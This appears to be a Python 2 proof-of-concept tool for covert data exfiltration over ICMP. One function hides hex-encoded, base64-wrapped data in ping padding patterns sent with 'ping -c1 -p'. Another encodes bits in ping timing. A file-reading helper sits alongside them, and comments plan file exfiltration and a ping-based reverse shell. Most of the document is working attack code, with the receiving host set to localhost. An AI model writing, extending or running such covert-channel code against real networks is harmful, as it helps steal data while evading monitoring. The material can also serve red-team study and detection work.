import os, sys, base64
from time import sleep

# different methods of exfiltration:
# - time-based (server and client pre-establish time diff, maybe pattern)
# - Timestamp-binary (different length, so easily seen, maybe packets can
#   be modified so that length is the same with padding)
# - data-based (remaining bytes - more noisy)
#
# maybe option to add a reverse shell: server on client, receives
# data from pings, sends back data with pings.

def dataFile(filename):
    f = open(filename, "r")
    content = f.read()
    f.close()

    return content

# - data-based (remaining bytes - more noisy)
def exfiltrateLastBytes(data, ip):

    # add final signal to stop receiving data
    string = base64.b64encode(data).encode("hex") + "0a"

    # split into blocks to send message
    blocks = []
    for i in range(0, len(string), 32):
        blocks.append(string[i:i+32])

    # make last block padded
    blocks[-1] = blocks[-1] + (32 - len(blocks[-1])) * "0"

    # send blocks one by one
    for i in blocks:
        os.system("ping -c1 -p {} {} > /dev/null".format(i, ip))

# - time-based (send in time sequence)
def exfiltrateTimeBased(data, ip):

    seq = bin(int((data).encode("hex"), 16))

    print "[*] Sending encoded message: \"{}\"".format(data)

    for i in seq[2:]:
        sleep(.1)
        if int(i):
            os.system("ping -c1 {} > /dev/null".format(ip))
        else:
            sleep(.1)

    print "[*] Message sent to {}".format(ip)
    os.system("ping -c1 -p {} {} > /dev/null".format("0a", ip))

if __name__ == "__main__":

    data = sys.argv[1]
    ip = "127.0.0.1"

    # add argparse support for file exfiltration or simple info

    if data:

        # if file flag is set:
        #   data = dataFile(data)

        # exfiltrateLastBytes(data, ip)
        exfiltrateTimeBased(data, ip)
